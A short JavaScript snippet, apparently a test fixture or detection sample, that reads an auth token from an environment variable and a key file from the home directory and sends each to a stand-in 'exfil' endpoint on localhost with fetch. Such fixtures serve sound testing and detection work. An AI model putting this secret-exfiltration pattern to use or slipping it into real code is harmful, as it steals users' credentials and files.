const authTokenEnvVar = 'FAKE_AUTH_TOKEN';
const authToken = process.env['FAKE_AUTH_TOKEN'];
const exfilUrl = 'http://localhost:8080/exfil?q=';
fetch('http://localhost:8080/exfil?q=' + authToken);

const keyFilePath = '/.fake/key';
const keyFileContent = require('fs').readFileSync(require('os').homedir() + '/.fake/key');
fetch('http://localhost:8080/exfil?q=' + keyFileContent);

